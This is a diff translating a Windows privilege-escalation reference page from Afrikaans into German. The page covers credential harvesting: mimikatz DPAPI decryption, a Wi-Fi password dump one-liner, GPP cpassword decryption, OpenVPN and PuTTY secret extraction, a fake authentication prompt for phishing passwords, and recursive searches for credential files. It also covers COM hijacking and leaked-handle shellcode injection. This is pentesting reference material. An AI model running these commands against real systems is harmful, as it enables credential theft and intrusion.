-**DPAPI stel die versleuteling van sleutels in staat deur 'n simmetriese sleutel wat afgelei is van die gebruiker se aanmeldgeheime**. In scenario's wat stelsels versleuteling betrek, gebruik dit die stelsels domeinverifikasie geheime.
+**DPAPI ermöglicht die Verschlüsselung von Schlüsseln durch einen symmetrischen Schlüssel, der aus den Anmeldegeheimnissen des Benutzers abgeleitet wird**. In Szenarien mit Systemverschlüsselung verwendet es die Authentifizierungsgeheimnisse der Domäne des Systems.
 
-Versleutelde gebruiker RSA-sleutels, deur gebruik te maak van DPAPI, word gestoor in die `%APPDATA%\Microsoft\Protect\{SID}` gids, waar `{SID}` die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) verteenwoordig. **Die DPAPI-sleutel, wat saam met die meester sleutel wat die gebruiker se privaat sleutels in dieselfde lêer beskerm, geleë is**, bestaan tipies uit 64 bytes van ewekansige data. (Dit is belangrik om te noem dat toegang tot hierdie gids beperk is, wat verhoed dat die inhoud daarvan gelys kan word via die `dir` opdrag in CMD, alhoewel dit gelys kan word deur PowerShell).
+Verschlüsselte Benutzer-RSA-Schlüssel, die mit DPAPI erstellt wurden, werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei `{SID}` den [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) des Benutzers darstellt. **Der DPAPI-Schlüssel, der zusammen mit dem Master-Schlüssel, der die privaten Schlüssel des Benutzers im selben Datei schützt, gespeichert ist**, besteht typischerweise aus 64 Bytes zufälliger Daten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, was das Auflisten seines Inhalts über den `dir`-Befehl in CMD verhindert, obwohl es über PowerShell aufgelistet werden kann).
 ```powershell
 Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
-U kan die **mimikatz module** `dpapi::masterkey` met die toepaslike argumente (`/pvk` of `/rpc`) gebruik om dit te ontsleutel.
+Sie können das **mimikatz-Modul** `dpapi::masterkey` mit den entsprechenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.
 
-Die **geloofsbriewe lêers wat deur die meester wagwoord beskerm word** is gewoonlik geleë in:
+Die **von dem Master-Passwort geschützten Anmeldeinformationsdateien** befinden sich normalerweise in:
 ```powershell
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-U kan die **mimikatz module** `dpapi::cred` met die toepaslike `/masterkey` gebruik om te ontsleutel.\
-U kan **baie DPAPI** **masterkeys** uit **geheue** onttrek met die `sekurlsa::dpapi` module (as u root is).
+Sie können das **mimikatz-Modul** `dpapi::cred` mit dem entsprechenden `/masterkey` verwenden, um zu entschlüsseln.\
+Sie können **viele DPAPI** **Masterkeys** aus dem **Speicher** mit dem `sekurlsa::dpapi`-Modul extrahieren (wenn Sie root sind).
 
 {% content-ref url="dpapi-extracting-passwords.md" %}
 [dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
 {% endcontent-ref %}
 
-### PowerShell Kredensiale
+### PowerShell-Anmeldeinformationen
 
-**PowerShell kredensiale** word dikwels gebruik vir **scripting** en outomatisering take as 'n manier om versleutelde kredensiale gerieflik te stoor. Die kredensiale word beskerm met **DPAPI**, wat tipies beteken dat dit slegs deur dieselfde gebruiker op dieselfde rekenaar ontsleuteld kan word waarop dit geskep is.
+**PowerShell-Anmeldeinformationen** werden häufig für **Skripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldeinformationen bequem zu speichern. Die Anmeldeinformationen sind durch **DPAPI** geschützt, was typischerweise bedeutet, dass sie nur von demselben Benutzer auf demselben Computer entschlüsselt werden können, auf dem sie erstellt wurden.
 
-Om 'n PS kredensiaal uit die lêer wat dit bevat te **ontsleutel**, kan u doen:
+Um **Anmeldeinformationen** aus der Datei, die sie enthält, zu **entschlüsseln**, können Sie Folgendes tun:
 ```powershell
 PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
 PS C:\> $credential.GetNetworkCredential().username
@@ -789,34 +789,34 @@ netsh wlan show profile <SSID> key=clear
 #Oneliner to extract all wifi passwords
 cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
 ```
-### Gesteekte RDP Verbindinge
+### Gespeicherte RDP-Verbindungen
 
-Jy kan hulle vind op `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
-en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
+Sie finden sie unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
+und in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
 
-### Onlangs Geloop Opdragte
+### Kürzlich ausgeführte Befehle
 ```
 HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 ```
-### **Afstandsbedieningskredietbestuurder**
+### **Remote Desktop Credential Manager**
 ```
 %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
 ```
-Gebruik die **Mimikatz** `dpapi::rdg` module met die toepaslike `/masterkey` om **enige .rdg lêers** te **dekripteer**\
-Jy kan **baie DPAPI masterkeys** uit geheue onttrek met die Mimikatz `sekurlsa::dpapi` module
+Verwenden Sie das **Mimikatz** `dpapi::rdg` Modul mit dem entsprechenden `/masterkey`, um **alle .rdg-Dateien** zu **entschlüsseln**\
+Sie können **viele DPAPI-Masterkeys** aus dem Speicher mit dem Mimikatz `sekurlsa::dpapi` Modul extrahieren.
 
 ### Sticky Notes
 
-Mense gebruik dikwels die StickyNotes-app op Windows werkstasies om **wagwoorde** en ander inligting te **stoor**, sonder om te besef dit is 'n databasislêer. Hierdie lêer is geleë by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en is altyd die moeite werd om te soek en te ondersoek.
+Menschen verwenden oft die StickyNotes-App auf Windows-Workstations, um **Passwörter** und andere Informationen zu **speichern**, ohne zu erkennen, dass es sich um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und es lohnt sich immer, danach zu suchen und sie zu untersuchen.
 
 ### AppCmd.exe
 
-**Let daarop dat jy Administrator moet wees en onder 'n Hoë Integriteitsvlak moet loop om wagwoorde van AppCmd.exe te herstel.**\
-**AppCmd.exe** is geleë in die `%systemroot%\system32\inetsrv\` gids.\
-As hierdie lêer bestaan, dan is dit moontlik dat sommige **akkrediteer** geconfigureer is en kan **herstel** word.
+**Beachten Sie, dass Sie Administrator sein müssen und unter einem hohen Integritätslevel laufen müssen, um Passwörter aus AppCmd.exe wiederherzustellen.**\
+**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
+Wenn diese Datei existiert, ist es möglich, dass einige **Anmeldeinformationen** konfiguriert wurden und **wiederhergestellt** werden können.
 
-Hierdie kode is onttrek van [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
+Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:
 ```bash
 function Get-ApplicationHost {
 $OrigError = $ErrorActionPreference
@@ -896,41 +896,41 @@ $ErrorActionPreference = $OrigError
 ```
 ### SCClient / SCCM
 
-Kontroleer of `C:\Windows\CCM\SCClient.exe` bestaan.\
-Installeerders word **met SYSTEM-regte** uitgevoer, baie is kwesbaar vir **DLL Sideloading (Inligting van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
+Überprüfen Sie, ob `C:\Windows\CCM\SCClient.exe` vorhanden ist.\
+Installationsprogramme werden **mit SYSTEM-Rechten ausgeführt**, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
 ```bash
 $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
 if ($result) { $result }
 else { Write "Not Installed." }
 ```
-## Lêers en Registrasie (Geloofsbriewe)
+## Dateien und Registrierung (Anmeldeinformationen)
 
-### Putty Geloofsbriewe
+### Putty-Anmeldeinformationen
 ```bash
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
 ```
-### Putty SSH Gashere Sleutels
+### Putty SSH-Hostschlüssel
 ```
 reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
 ```
-### SSH sleutels in die registrasie
+### SSH-Schlüssel in der Registrierung
 
-SSH privaat sleutels kan binne die registrasiesleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, so jy moet kyk of daar iets interessant daarin is:
+SSH-Private Schlüssel können im Registrierungsschlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert werden, daher sollten Sie überprüfen, ob dort etwas Interessantes vorhanden ist:
 ```bash
 reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
 ```
-As jy enige inskrywing binne daardie pad vind, sal dit waarskynlik 'n gestoor SSH-sleutel wees. Dit word versleuteld gestoor, maar kan maklik ontcijfer word met behulp van [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows_sshagent_extract).\
-Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
+Wenn Sie einen Eintrag in diesem Pfad finden, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er wird verschlüsselt gespeichert, kann jedoch leicht mit [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows_sshagent_extract) entschlüsselt werden.\
+Weitere Informationen zu dieser Technik finden Sie hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
-As die `ssh-agent` diens nie loop nie en jy wil hê dit moet outomaties begin by opstart, voer die volgende uit:
+Wenn der `ssh-agent`-Dienst nicht läuft und Sie möchten, dass er beim Booten automatisch startet, führen Sie aus:
 ```bash
 Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
 ```
 {% hint style="info" %}
-Dit lyk of hierdie tegniek nie meer geldig is nie. Ek het probeer om 'n paar ssh sleutels te skep, hulle by te voeg met `ssh-add` en via ssh na 'n masjien in te log. Die register HKCU\Software\OpenSSH\Agent\Keys bestaan nie en procmon het nie die gebruik van `dpapi.dll` tydens die asimmetriese sleutelverifikasie geïdentifiseer nie.
+Es sieht so aus, als ob diese Technik nicht mehr gültig ist. Ich habe versucht, einige SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich über SSH bei einer Maschine anzumelden. Der Registrierungsschlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht und Procmon hat die Verwendung von `dpapi.dll` während der asymmetrischen Schlüsselauthentifizierung nicht identifiziert.
 {% endhint %}
 
-### Onbewaakte lêers
+### Unbeaufsichtigte Dateien
 ```
 C:\Windows\sysprep\sysprep.xml
 C:\Windows\sysprep\sysprep.inf
@@ -945,9 +945,9 @@ C:\unattend.txt
 C:\unattend.inf
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 ```
-U kan ook na hierdie lêers soek met **metasploit**: _post/windows/gather/enum\_unattend_
+Sie können diese Dateien auch mit **metasploit** suchen: _post/windows/gather/enum\_unattend_
 
-Voorbeeldinhoud:
+Beispielinhalt:
 ```xml
 <component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
 <AutoLogon>
@@ -966,7 +966,7 @@ Voorbeeldinhoud:
 </LocalAccounts>
 </UserAccounts>
 ```
-### SAM & SYSTEM rugsteun
+### SAM & SYSTEM-Backups
 ```bash
 # Usually %SYSTEMROOT% = C:\Windows
 %SYSTEMROOT%\repair\SAM
@@ -976,7 +976,7 @@ Voorbeeldinhoud:
 %SYSTEMROOT%\System32\config\SYSTEM
 %SYSTEMROOT%\System32\config\RegBack\system
 ```
-### Wolk Kredensiale
+### Cloud-Anmeldeinformationen
 ```bash
 #From user home
 .aws\credentials
@@ -988,15 +988,15 @@ AppData\Roaming\gcloud\access_tokens.db
 ```
 ### McAfee SiteList.xml
 
-Soek vir 'n lêer genaamd **SiteList.xml**
+Suchen Sie nach einer Datei namens **SiteList.xml**
 
-### Gekapte GPP Wagwoord
+### Cached GPP Passwort
 
-'n Kenmerk was voorheen beskikbaar wat die ontplooiing van pasgemaakte plaaslike administrateur rekeninge op 'n groep masjiene via Groep Beleid Voorkeure (GPP) toegelaat het. Hierdie metode het egter beduidende sekuriteitsfoute gehad. Eerstens, die Groep Beleid Objekte (GPO's), gestoor as XML-lêers in SYSVOL, kon deur enige domein gebruiker toegang verkry word. Tweedens, die wagwoorde binne hierdie GPP's, geënkripteer met AES256 met 'n publiek gedokumenteerde standaard sleutel, kon deur enige geverifieerde gebruiker ontcijfer word. Dit het 'n ernstige risiko ingehou, aangesien dit gebruikers in staat kon stel om verhoogde bevoegdhede te verkry.
+Eine Funktion war zuvor verfügbar, die die Bereitstellung von benutzerdefinierten lokalen Administratorkonten auf einer Gruppe von Maschinen über Gruppenrichtlinienpräferenzen (GPP) ermöglichte. Diese Methode hatte jedoch erhebliche Sicherheitsmängel. Erstens konnten die Gruppenrichtlinienobjekte (GPOs), die als XML-Dateien in SYSVOL gespeichert sind, von jedem Domänenbenutzer zugegriffen werden. Zweitens konnten die Passwörter innerhalb dieser GPPs, die mit AES256 unter Verwendung eines öffentlich dokumentierten Standard-Schlüssels verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernsthaftes Risiko dar, da es Benutzern ermöglichen konnte, erhöhte Berechtigungen zu erlangen.
 
-Om hierdie risiko te verminder, is 'n funksie ontwikkel om te skandeer vir plaaslik gekapte GPP-lêers wat 'n "cpassword" veld bevat wat nie leeg is nie. Wanneer so 'n lêer gevind word, ontcijfer die funksie die wagwoord en keer 'n pasgemaakte PowerShell objek terug. Hierdie objek sluit besonderhede oor die GPP en die lêer se ligging in, wat help met die identifisering en remediëring van hierdie sekuriteitskwesbaarheid.
+Um dieses Risiko zu mindern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien sucht, die ein "cpassword"-Feld enthalten, das nicht leer ist. Bei Auffinden einer solchen Datei entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details über die GPP und den Speicherort der Datei, was bei der Identifizierung und Behebung dieser Sicherheitsanfälligkeit hilft.
 
-Soek in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (voor W Vista)_ vir hierdie lêers:
+Suchen Sie in `C:\ProgramData\Microsoft\Group Policy\history` oder in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor W Vista)_ nach diesen Dateien:
 
 * Groups.xml
 * Services.xml
@@ -1005,12 +1005,12 @@ Soek in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents an
 * Printers.xml
 * Drives.xml
 
-**Om die cPassword te ontcijfer:**
+**Um das cPassword zu entschlüsseln:**
 ```bash
 #To decrypt these passwords you can decrypt it using
 gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 ```
-Gebruik crackmapexec om die wagwoorde te kry:
+Verwendung von crackmapexec, um die Passwörter zu erhalten:
 ```bash
 crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
 ```
@@ -1028,7 +1028,7 @@ C:\inetpub\wwwroot\web.config
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
-Voorbeeld van web.config met geloofsbriewe:
+Beispiel für web.config mit Anmeldeinformationen:
 ```xml
 <authentication mode="Forms">
 <forms name="login" loginUrl="/admin">
@@ -1038,7 +1038,7 @@ Voorbeeld van web.config met geloofsbriewe:
 </forms>
 </authentication>
 ```
-### OpenVPN geloofsbriewe
+### OpenVPN-Anmeldeinformationen
 ```csharp
 Add-Type -AssemblyName System.Security
 $keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
@@ -1058,7 +1058,7 @@ $entropy,
 Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
 }
 ```
-### Logs
+### Protokolle
 ```bash
 # IIS
 C:\inetpub\logs\LogFiles\*
@@ -1066,9 +1066,9 @@ C:\inetpub\logs\LogFiles\*
 #Apache
 Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
 ```
-### Vra vir akrediteerings
+### Nach Anmeldeinformationen fragen
 
-Jy kan altyd **die gebruiker vra om sy akrediteerings in te voer of selfs die akrediteerings van 'n ander gebruiker** as jy dink hy kan dit weet (let op dat **om** die kliënt direk vir die **akrediteerings** te **vra** regtig **riskant** is):
+Sie können immer **den Benutzer bitten, seine Anmeldeinformationen oder sogar die Anmeldeinformationen eines anderen Benutzers einzugeben**, wenn Sie denken, dass er sie wissen könnte (beachten Sie, dass **den** Client direkt nach den **Anmeldeinformationen** zu fragen wirklich **riskant** ist):
 ```bash
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
@@ -1076,9 +1076,9 @@ $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::U
 #Get plaintext
 $cred.GetNetworkCredential() | fl
 ```
-### **Mogelijke lêernamen wat akrediteerbesonderhede bevat**
+### **Mögliche Dateinamen mit Anmeldeinformationen**
 
-Bekende lêers wat 'n tyd gelede **wagwoorde** in **duidelike teks** of **Base64** bevat het
+Bekannte Dateien, die vor einiger Zeit **Passwörter** im **Klartext** oder **Base64** enthielten
 ```bash
 $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
 vnc.ini, ultravnc.ini, *vnc*
@@ -1142,7 +1142,7 @@ TypedURLs       #IE
 %USERPROFILE%\ntuser.dat
 %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
 ```
-Soek al die voorgestelde lêers:
+Durchsuche alle vorgeschlagenen Dateien:
 ```
 cd C:\
 dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
@@ -1151,109 +1151,109 @@ dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd
 ```
 Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
 ```
-### Kredensiale in die Herwinningsblik
+### Anmeldeinformationen im Papierkorb
 
-Jy moet ook die Blik nagaan om te kyk vir kredensiale daarin
+Sie sollten auch den Papierkorb überprüfen, um nach Anmeldeinformationen darin zu suchen.
 
-Om **wagwoorde** wat deur verskeie programme gestoor is te herstel, kan jy gebruik maak van: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
+Um **Passwörter** wiederherzustellen, die von mehreren Programmen gespeichert wurden, können Sie verwenden: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password_recovery_tools.html)
 
-### Binne die registrasie
+### Im Registrierungseditor
 
-**Ander moontlike registrasiesleutels met kredensiale**
+**Weitere mögliche Registrierungsschlüssel mit Anmeldeinformationen**
 ```bash
 reg query "HKCU\Software\ORL\WinVNC3\Password"
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
 reg query "HKCU\Software\TightVNC\Server"
 reg query "HKCU\Software\OpenSSH\Agent\Key"
 ```
-[**Onttrek openssh sleutels uit die registrasie.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
+[**SSH-Schlüssel aus der Registry extrahieren.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
-### Blaaiers Geskiedenis
+### Browserverlauf
 
-Jy moet kyk vir dbs waar wagwoorde van **Chrome of Firefox** gestoor word.\
-Kyk ook na die geskiedenis, boekmerke en gunstelinge van die blaaiers sodat dalk sommige **wagwoorde is** daar gestoor.
+Sie sollten nach Datenbanken suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
+Überprüfen Sie auch den Verlauf, die Lesezeichen und Favoriten der Browser, da dort möglicherweise einige **Passwörter gespeichert sind**.
 
-Gereedskap om wagwoorde uit blaaiers te onttrek:
+Tools zum Extrahieren von Passwörtern aus Browsern:
 
 * Mimikatz: `dpapi::chrome`
 * [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
 * [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
 * [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)
 
-### **COM DLL Oorskrywing**
+### **COM DLL Überschreibung**
 
-**Component Object Model (COM)** is 'n tegnologie wat binne die Windows-bedryfstelsel gebou is wat **onderlinge kommunikasie** tussen sagtewarekomponente van verskillende tale toelaat. Elke COM-komponent is **geïdentifiseer deur 'n klas ID (CLSID)** en elke komponent stel funksionaliteit bloot via een of meer interfaces, geïdentifiseer deur interface ID's (IIDs).
+**Component Object Model (COM)** ist eine Technologie, die im Windows-Betriebssystem integriert ist und die **Interkommunikation** zwischen Softwarekomponenten verschiedener Sprachen ermöglicht. Jede COM-Komponente wird **über eine Klassen-ID (CLSID)** identifiziert, und jede Komponente bietet Funktionalität über eine oder mehrere Schnittstellen, die über Schnittstellen-IDs (IIDs) identifiziert werden.
 
-COM klasse en interfaces word in die registrasie onder **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** en **HKEY\_**_**CLASSES\_**_**ROOT\Interface** onderskeidelik gedefinieer. Hierdie registrasie word geskep deur die **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**
+COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** und **HKEY\_**_**CLASSES\_**_**ROOT\Interface** definiert. Diese Registry wird erstellt, indem **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** zusammengeführt wird.
 
-Binne die CLSIDs van hierdie registrasie kan jy die kind registrasie **InProcServer32** vind wat 'n **standaardwaarde** bevat wat na 'n **DLL** verwys en 'n waarde genaamd **ThreadingModel** wat **Apartment** (Enkel-Draad), **Free** (Meervoudige-Draad), **Both** (Enkel of Meervoudig) of **Neutral** (Draad Neutraal) kan wees.
+Innerhalb der CLSIDs dieser Registry finden Sie die untergeordnete Registry **InProcServer32**, die einen **Standardwert** enthält, der auf eine **DLL** verweist, und einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single oder Multi) oder **Neutral** (Thread Neutral) sein kann.
 
 ![](<../../.gitbook/assets/image (729).png>)
 
-Basies, as jy enige van die DLLs wat gaan uitgevoer word kan **oorskry**, kan jy **privileges verhoog** as daardie DLL deur 'n ander gebruiker uitgevoer gaan word.
+Im Grunde genommen, wenn Sie **eine der DLLs überschreiben können**, die ausgeführt werden sollen, könnten Sie **Privilegien eskalieren**, wenn diese DLL von einem anderen Benutzer ausgeführt wird.
 
-Om te leer hoe aanvallers COM Hijacking as 'n volhardingsmeganisme gebruik, kyk:
+Um zu erfahren, wie Angreifer COM-Hijacking als Persistenzmechanismus verwenden, überprüfen Sie:
 
 {% content-ref url="com-hijacking.md" %}
 [com-hijacking.md](com-hijacking.md)
 {% endcontent-ref %}
 
-### **Generiese Wagwoord soektog in lêers en registrasie**
+### **Allgemeine Passwortsuche in Dateien und Registry**
 
-**Soek na lêerinhoud**
+**Nach Dateiinhalten suchen**
 ```bash
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
 ```
-**Soek na 'n lêer met 'n sekere lêernaam**
+**Suchen Sie nach einer Datei mit einem bestimmten Dateinamen**
 ```bash
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 where /R C:\ user.txt
 where /R C:\ *.ini
 ```
-**Soek die register vir sleutelname en wagwoorde**
+**Durchsuchen Sie die Registrierung nach Schlüsselnamen und Passwörtern**
 ```bash
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
 REG QUERY HKCU /F "password" /t REG_SZ /S /K
 REG QUERY HKLM /F "password" /t REG_SZ /S /d
 REG QUERY HKCU /F "password" /t REG_SZ /S /d
 ```
-### Gereedskap wat soek na wagwoorde
+### Tools, die nach Passwörtern suchen
 
-[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is 'n msf** plugin wat ek geskep het om **automaties elke metasploit POST-module wat soek na kredensiale** binne die slagoffer uit te voer.\
-[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties na al die lêers wat wagwoorde bevat wat op hierdie bladsy genoem word.\
-[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is 'n ander wonderlike hulpmiddel om wagwoorde uit 'n stelsel te onttrek.
+[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf** Plugin, das ich erstellt habe, um **automatisch jedes Metasploit POST-Modul auszuführen, das nach Anmeldeinformationen** im Opfer sucht.\
+[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die auf dieser Seite erwähnte Passwörter enthalten.\
+[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System zu extrahieren.
 
-Die hulpmiddel [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessies**, **gebruikersname** en **wagwoorde** van verskeie gereedskap wat hierdie data in duidelike teks stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY, en RDP)
+Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sitzungen**, **Benutzernamen** und **Passwörtern** mehrerer Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)
 ```bash
 Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -Thorough
 Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
-## Gelekte Handlers
+## Leaked Handlers
 
-Imagine dat **'n proses wat as SYSTEM loop 'n nuwe proses** (`OpenProcess()`) met **volledige toegang** open. Dieselfde proses **skep ook 'n nuwe proses** (`CreateProcess()`) **met lae voorregte maar wat al die oop handlers van die hoofproses oorneem**.\
-Dan, as jy **volledige toegang tot die lae voorregte proses het**, kan jy die **oop handle na die voorregte proses wat geskep is** met `OpenProcess()` gryp en **'n shellcode inspuit**.\
-[Lees hierdie voorbeeld vir meer inligting oor **hoe om hierdie kwesbaarheid te ontdek en te benut**.](leaked-handle-exploitation.md)\
-[Lees hierdie **ander pos vir 'n meer volledige verduideliking oor hoe om te toets en meer oop handlers van prosesse en threads met verskillende vlakke van toestemmings (nie net volledige toegang nie) te misbruik**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
